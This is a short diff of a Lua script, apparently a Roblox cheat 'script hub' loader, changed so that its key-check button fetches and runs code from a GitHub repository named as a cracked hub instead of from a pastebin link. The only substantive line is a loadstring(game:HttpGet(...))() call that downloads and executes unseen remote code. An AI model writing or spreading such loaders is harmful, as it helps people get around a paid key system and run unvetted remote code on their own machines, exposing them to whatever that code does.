@@ -234,6 +234,6 @@ end)
 CheckKey.MouseButton1Click:Connect(function()
 
     script_key=KeyCheck.Text;
-    loadstring(game:HttpGet("https://pastebin.com/htzstwaT"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/l1mppuzzzz/nuthubcrakced/refs/heads/main/w"))()
 
 end)
